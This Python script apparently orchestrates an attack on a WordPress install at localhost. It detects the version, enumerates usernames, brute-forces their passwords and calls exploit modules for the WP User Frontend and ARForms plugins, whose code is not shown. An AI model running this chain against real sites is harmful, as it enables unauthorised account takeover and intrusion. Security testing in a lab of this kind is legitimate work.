
import WPDetector
import WPEnumeration
import Arforms
import WPPassBruteforcer
import WP_User_Frontend


def main():
    url = "http://127.0.0.1/wordpress/"
    #WP Detector - module 1
    print("Getting version for WP...", url)
    version = WPDetector.WPDetector(url).detect()
    if version is None:
        print("Version not found")

    # Enumerator - module 2
    wpEnumerator = WPEnumeration.WPEnumeration(url)
    wpEnumerator.enumerate(1,2)
    userList = wpEnumerator.get_usernames()

    # Bruteforce - module 3
    wpBruteForce = WPPassBruteforcer.WPPassBruteforcer(url)
    wpBruteForce.domain = url
    credentials = wpBruteForce.bruteforce(userList, "")
    #WP exploit - module 4
    user_frontend_exploit=WP_User_Frontend.WP_User_Frontend(url)
    user_frontend_exploit.exploit(url)
    arforms = Arforms.Arforms(url)
    arforms.exploit(version)




if __name__ == '__main__':
    main()


